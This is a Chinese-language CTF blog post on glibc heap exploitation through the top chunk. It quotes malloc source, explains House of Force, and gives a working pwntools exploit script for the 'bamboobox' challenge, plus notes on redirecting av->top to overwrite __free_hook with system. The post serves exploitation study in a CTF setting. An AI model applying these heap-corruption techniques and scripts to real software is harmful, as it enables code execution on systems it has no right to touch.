---
clayout: post
title:  "top chunk利用"
date:   2020-2-24
desc: ""
keywords: ""
categories: [Binary]
tags: [pwn]
icon: icon-html
---

# top chunk利用

## House of Orange

略

## House of Force

```c
  /* finally, do the allocation */
  p = av->top;
  size = chunksize (p);

  /* check that one of the above allocation paths succeeded */
  if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE))
    {
      remainder_size = size - nb;
      remainder = chunk_at_offset (p, nb);
      av->top = remainder;
      set_head (p, nb | PREV_INUSE | (av != &main_arena ? NON_MAIN_ARENA : 0));
      set_head (remainder, remainder_size | PREV_INUSE);
      check_malloced_chunk (av, p, nb);
      return chunk2mem (p);
    }
```

从top chunk分配

```c
if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE))
```

转化为无符号数比较，如果把size改为-1必能过

申请后更新top chunk

```c
      remainder_size = size - nb;
      remainder = chunk_at_offset (p, nb);
      av->top = remainder;
```

```c
/* Treat space at ptr + offset as a chunk */
#define chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))
```

nb是申请的size，chunk_at_offset根据nb找到新的top chunk位置

如果能把top chunk改为-1，并且能申请任意大小的chunk，就能控制top chunk到任意位置

glibc2.29上香

### hitcontraining_bamboobox

有个放着hello_message和goodbye_message函数的白给chunk，把goodbye_message改成magic，exit拿flag

edit size没验，可以溢出改top chunk size，把指针抬到白给chunk

```python
from pwn import *
r = remote('node3.buuoj.cn',28044)
#r = process('./bamboobox')
elf = ELF('./bamboobox')

magic = 0x400d49

def show():
	r.sendlineafter('Your choice:','1')

def add(size,name):
	r.sendlineafter('Your choice:','2')
	r.sendlineafter('name:',str(size))
	r.sendlineafter('item:',name)

def edit(index,size,name):
	r.sendlineafter('Your choice:','3')
	r.sendlineafter('item:',str(index))
	r.sendlineafter('name:',str(size))
	r.sendafter('item:',name)

def free(index):
	r.sendlineafter('Your choice:','4')
	r.sendlineafter('item:',str(index))


add(0x60,'fuck')
edit(0,0x70,'a'*0x60+p64(0)+'\xff'*8)
add(-0x70-0x20-0x10,'aaaa')
add(0x20,p64(magic)*2)
r.interactive()
```



## 利用top chunk写free hook

在malloc hook写onegadget不好使，用realloc调整栈再跳onegadget也不好使，没办法直接写free hook，可以考虑利用top chunk写free hook

```c
  /* finally, do the allocation */
  p = av->top;
  size = chunksize (p);

  /* check that one of the above allocation paths succeeded */
  if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE))
    {
      remainder_size = size - nb;
      remainder = chunk_at_offset (p, nb);
      av->top = remainder;
      set_head (p, nb | PREV_INUSE | (av != &main_arena ? NON_MAIN_ARENA : 0));
      set_head (remainder, remainder_size | PREV_INUSE);
      check_malloced_chunk (av, p, nb);
      return chunk2mem (p);
    }
```

av->top在main_arena

glibc2.23

把top chunk指针改为free hook上方某个符合top chunk size条件的位置，一般使用fastbin attack，malloc hook-0x3有满足条件的size，如果一次不够写到av->top可以控制main_arena+48的fastbin指针指向有合法size的main_arena+16再来一次

👴为什么不直接打malloc_hook，因为onegadget不好使

把av->top覆盖为free_hook-0xb58，size符合条件

然后malloc(0x90)18次，下一次就到free hook，把system写进free hook

👴为什么不把onegadget写进free hook，因为onegadget不好使